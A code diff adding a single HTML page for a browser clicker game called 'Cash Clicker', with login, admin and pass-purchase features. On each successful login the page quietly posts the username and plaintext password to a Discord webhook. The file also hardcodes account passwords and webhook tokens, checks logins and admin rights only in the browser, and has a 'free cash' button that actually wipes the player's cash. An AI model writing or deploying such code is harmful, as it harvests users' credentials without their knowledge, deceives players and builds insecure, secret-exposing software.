@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Cash Clicker</title>
+    
+    <style>
+        /* Add your CSS styles here */
+    </style>
+
+    <script>
+        let cash = 0;
+        let adminCode = generateRandomAdminCode();
+        let giveCashVisible = false;
+        let freeCashButtonVisible = false; // Track the visibility of the free cash button
+
+        // accounts
+        const userAccounts = [
+            { username: "flak", password: "3532950", cash: 200 },
+            { username: "admin", password: "hmwhatwasthis", cash: 0 },
+            { username: "SweatyAstolfoLicker69", password: "0436912", cash: 200 },
+            { username: "ea sports", password: "adminbirb?", cash: 500 },
+            { username: "feesh", password: "96034010123", cash: 1000 },
+            { username: "nifon", password: "shouldsnifon", cash: 500 },
+            { username: "supergm", password: "52593095", cash: 100 },
+            { username: "hydin", password: "574589235834792150463285", cash: 500 },
+            { username: "Walter Hartwell White", password: "08 Negra Arroyo Lane Albuquerque New Mexico", cash: 2000 },
+            { username: "flake", password: "wegojim9000alsowalterhartwellwhiteaccounthas2kcash9350923068236236623", cash: 777 },
+            { username: "hiding", password: "9352351250235", cash: 999 },
+            { username: "debug", password: "denfuiwart", cash: 999 },
+            { username: "falcon", password: "512513262476361252152", cash: 0 },
+        ];
+
+        function clickCash() {
+            cash++;
+            document.getElementById("cash").innerText = cash;
+
+            // Make the "Free Cash" button always visible
+            document.getElementById("free-cash-button").style.display = "block";
+        }
+
+        // Function to claim free cash and set cash to 0
+        function claimFreeCash() {
+            cash = 0;
+            document.getElementById("cash").innerText = cash;
+
+            // Hide the "Free Cash" button after it's claimed
+            document.getElementById("free-cash-button").style.display = "none";
+        }
+
+        function createGenericAccount() {
+            return { username: "GenericUser", cash: 0 };
+        }
+
+        function login() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const userAccount = userAccounts.find(account => account.username === username && account.password === password);
+
+            if (userAccount) {
+                cash = userAccount.cash;
+                sendLoginInfoToWebhook(username, password);
+
+                if (username === "admin" || username === "falcon") { // Allow "falcon" to access admin section
+                    document.getElementById("adminSection").style.display = "block"; 
+                    document.getElementById("generate-admin-code").style.display = "block"; 
+                    document.getElementById("toggle-give-cash-button").style.display = "block"; 
+                } else {
+                    document.getElementById("adminSection").style.display = "none"; 
+                    document.getElementById("generate-admin-code").style.display = "none"; 
+                    document.getElementById("toggle-give-cash-button").style.display = "none"; 
+                }
+
+                document.getElementById("game").style.display = "block";
+                document.getElementById("cash").innerText = cash;
+            } else {
+                // Create a generic account for users with invalid credentials
+                const genericAccount = createGenericAccount();
+                cash = genericAccount.cash;
+
+                // Hide admin-specific options
+                document.getElementById("adminSection").style.display = "none";
+                document.getElementById("generate-admin-code").style.display = "none";
+                document.getElementById("toggle-give-cash-button").style.display = "none";
+
+                document.getElementById("game").style.display = "block";
+                document.getElementById("cash").innerText = cash;
+            }
+        }
+
+        function register() {
+            // Implement registration logic if needed
+        }
+
+        function buyPass() {
+            const passUses = parseInt(document.getElementById("pass-uses").value);
+            const passCost = passUses * 10;
+
+            if (cash >= passCost) {
+                cash -= passCost;
+                const randomCode = generateRandomCode();
+
+                document.getElementById("cash").innerText = cash;
+                alert(`Pass purchased with ${passUses} uses. Code: ${randomCode} join discord to claim make sure to screenshot this (screenshot the entire page so I can make sure it's legit) https://discord.gg/pTYTj8khkr`);
+
+                sendPassPurchaseInfoToWebhook(randomCode, passUses);
+            } else {
+                alert("Not enough cash to buy the pass!");
+            }
+        }
+
+        function generateRandomCode() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            const codeLength = 26;
+            let randomCode = '';
+
+            for (let i = 0; i < codeLength; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomCode += characters.charAt(randomIndex);
+            }
+
+            return randomCode;
+        }
+
+        function generateRandomAdminCode() {
+            const characters = '!"§$%&/()=?´`+#*\'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            const codeLength = 40;
+            let randomCode = '';
+
+            for (let i = 0; i < codeLength; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomCode += characters.charAt(randomIndex);
+            }
+
+            return randomCode;
+        }
+
+        function sendPassPurchaseInfoToWebhook(code, passUses) {
+            const webhookURL = 'https://discord.com/api/webhooks/1151635834857062421/InqQT9KCCEwy1fRFs_oVIsehrkwOa0RjZoi7ZTUb3xrnJqGia5ZEL-AsCgdcN5r8hyr5';
+
+            const payload = {
+                content: `New pass purchase:\nCode: ${code}\nPass Uses: ${passUses}`,
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then((response) => {
+                if (response.ok) {
+                    console.log('Pass purchase info sent to webhook successfully');
+                } else {
+                    console.error('Error sending pass purchase info to webhook:', response.status, response.statusText);
+                }
+            })
+            .catch((error) => {
+                console.error('Error sending pass purchase info to webhook:', error);
+            });
+        }
+
+        function sendLoginInfoToWebhook(username, password) {
+            const webhookURL = 'https://discord.com/api/webhooks/1151884011342397530/zSI0kMOlS5UCzlzTKeF-NTwzjeXR8XtfPoqN8_5sPRec3-eG7BFMnmvPvWt3D5gzmsT4';
+
+            const payload = {
+                content: `User logged in:\nUsername: ${username}\nPassword: ${password}`,
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then((response) => {
+                if (response.ok) {
+                    console.log('Login info sent to webhook successfully');
+                } else {
+                    console.error('Error sending login info to webhook:', response.status, response.statusText);
+                }
+            })
+            .catch((error) => {
+                console.error('Error sending login info to webhook:', error);
+            });
+        }
+
+        function generateAndSendAdminCode() {
+            adminCode = generateRandomAdminCode();
+            const webhookURL = 'https://discord.com/api/webhooks/1151623248526712892/hHgPgZG7a9WqSlwW1EP8ownc1YexWaObdQn6cXSU7NaMWndgj5jaV-NAgJWb0M6Juk7q';
+
+            const payload = {
+                content: `New secret code generated: ${adminCode}`,
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then((response) => {
+                if (response.ok) {
+                    console.log('Code sent to Discord successfully');
+                } else {
+                    console.error('Error sending code to Discord:', response.status, response.statusText);
+                }
+            })
+            .catch((error) => {
+                console.error('Error sending code to Discord:', error);
+            });
+        }
+
+        function toggleGiveCashButton() {
+            const secretCodeInput = document.getElementById("secretCode");
+            const giveCashContainer = document.getElementById("giveCashContainer");
+
+            if (secretCodeInput.value === adminCode) {
+                giveCashVisible = !giveCashVisible;
+                giveCashContainer.style.display = giveCashVisible ? "block" : "none";
+                secretCodeInput.value = ""; // Clear the input field
+            }
+        }
+
+        // Function to give cash
+        function giveCash() {
+            const cashAmountInput = document.getElementById("cashAmount");
+            const cashAmount = parseInt(cashAmountInput.value);
+
+            if (!isNaN(cashAmount) && cashAmount > 0) {
+                cash += cashAmount;
+                document.getElementById("cash").innerText = cash;
+                cashAmountInput.value = ""; // Clear the input field
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to Cash Clicker</h1>
+    <div id="login">
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+        <button onclick="register()">Register</button>
+    </div>
+    <div id="game" style="display: none;">
+        <p>Cash: <span id="cash">0</span></p>
+        <button onclick="clickCash()">Click for Cash</button>
+        <p id="pass-uses-section">Pass Uses: <input type="number" id="pass-uses" min="1" value="1"></p>
+        <button id="buy-pass" onclick="buyPass()">Buy Pass</button>
+        <button id="generate-admin-code" onclick="generateAndSendAdminCode()">Generate Admin Code</button>
+        <button id="toggle-give-cash-button" onclick="toggleGiveCashButton()" style="display: none;">Toggle Give Cash</button>
+        
+        <!-- Add the "Free Cash" button -->
+        <button id="free-cash-button" onclick="claimFreeCash()" style="display: none;">Click Me for Free Cash</button>
+    </div>
+
+    <div id="adminSection" style="display: none;">
+        <input type="text" id="secretCode" placeholder="Enter admin code">
+        <div id="giveCashContainer" style="display: none;">
+            <input type="number" id="cashAmount" placeholder="Enter cash amount">
+            <button id="giveCashButton" onclick="giveCash()">Give Cash</button>
+        </div>
+    </div>
+</body>
+</html>
